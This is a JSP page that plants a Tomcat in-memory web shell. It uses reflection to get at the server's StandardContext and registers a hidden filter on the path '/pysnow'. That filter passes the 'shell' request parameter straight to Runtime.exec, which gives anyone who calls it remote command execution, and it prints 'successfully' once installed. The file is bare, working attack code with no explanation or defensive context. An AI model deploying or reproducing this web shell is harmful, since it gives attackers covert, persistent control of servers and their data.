<%@ page import="org.apache.catalina.Context" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.ApplicationContextFacade" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.util.HashMap" %>
<%

    ServletContext servletContext = request.getServletContext();
    ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) servletContext;
    Field applicationContextFacadeContext = applicationContextFacade.getClass().getDeclaredField("context");
    applicationContextFacadeContext.setAccessible(true);

    ApplicationContext applicationContext = (ApplicationContext)
            applicationContextFacadeContext.get(applicationContextFacade);
    Field applicationContextContext = applicationContext.getClass().getDeclaredField("context");
    applicationContextContext.setAccessible(true);

    StandardContext standardContext = (StandardContext) applicationContextContext.get(applicationContext);

    Field filterConfigs = standardContext.getClass().getDeclaredField("filterConfigs");
    filterConfigs.setAccessible(true);
    HashMap hashMap = (HashMap) filterConfigs.get(standardContext);
    String filterName = "Filter";
    if (hashMap.get(filterName) == null) {
        Filter filter = new Filter() {
            @Override
            public void init(FilterConfig filterConfig) throws ServletException {
                System.out.println("注入初始化");
            }

            @Override
            public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)
                    throws IOException, ServletException {
                servletRequest.setCharacterEncoding("utf-8");
                servletResponse.setCharacterEncoding("utf-8");
                servletResponse.setContentType("text/html;charset=UTF-8");
                filterChain.doFilter(servletRequest, servletResponse);
                System.out.println(servletRequest.getParameter("shell"));
                Runtime.getRuntime().exec(servletRequest.getParameter("shell"));
                System.out.println("过滤中。。。");
            }

            @Override
            public void destroy() {
                // Filter.super.destroy();
            }
        };
        FilterDef filterDef = new FilterDef();
        filterDef.setFilter(filter);
        filterDef.setFilterName(filterName);
        filterDef.setFilterClass(filter.getClass().getName());
        standardContext.addFilterDef(filterDef);
        FilterMap filterMap = new FilterMap();
        filterMap.addURLPattern("/pysnow");
        filterMap.setFilterName(filterName);
        filterMap.setDispatcher(DispatcherType.REQUEST.name());
        standardContext.addFilterMapBefore(filterMap);
        Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
        constructor.setAccessible(true);
        ApplicationFilterConfig applicationFilterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);

        hashMap.put(filterName, applicationFilterConfig);
        response.getWriter().println("successfully");

        
    }
%>